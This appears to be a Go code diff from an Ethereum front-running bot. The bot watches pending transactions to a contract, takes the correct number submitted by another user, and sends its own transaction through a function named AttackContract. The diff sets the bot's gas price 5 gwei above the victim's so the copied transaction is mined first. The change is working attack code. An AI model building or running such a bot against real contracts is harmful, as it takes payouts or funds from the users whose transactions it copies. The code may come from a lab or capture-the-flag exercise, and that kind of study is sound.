@@ -60,7 +60,7 @@ func ContractInteract() error {
 					if methodIDHex == MethodIDContract {
 						argument := data[4:36]
 						correctNumber := new(big.Int).SetBytes(argument)
-						err = AttackContract(ethClient, correctNumber.Int64())
+						err = AttackContract(ethClient, correctNumber.Int64(), tx.GasPrice().Int64())
 					}
 				}
 			}
@@ -70,7 +70,7 @@ func ContractInteract() error {
 	}
 }
 
-func AttackContract(ethClient *ethclient.Client, correctNumber int64) error {
+func AttackContract(ethClient *ethclient.Client, correctNumber int64, gasPriceTx int64) error {
 
 	privateKey, err := crypto.HexToECDSA(os.Getenv("PRIVATE_KEY"))
 	if err != nil {
@@ -100,7 +100,7 @@ func AttackContract(ethClient *ethclient.Client, correctNumber int64) error {
 	data = append(data, paddedNumber...)
 
 	gasLimit := uint64(100000)
-	gasPrice := big.NewInt(20000000000)
+	gasPrice := big.NewInt(gasPriceTx + 5000000000)
 
 	contractAddress := common.HexToAddress(ContractAddress)
 	value := new(big.Int)
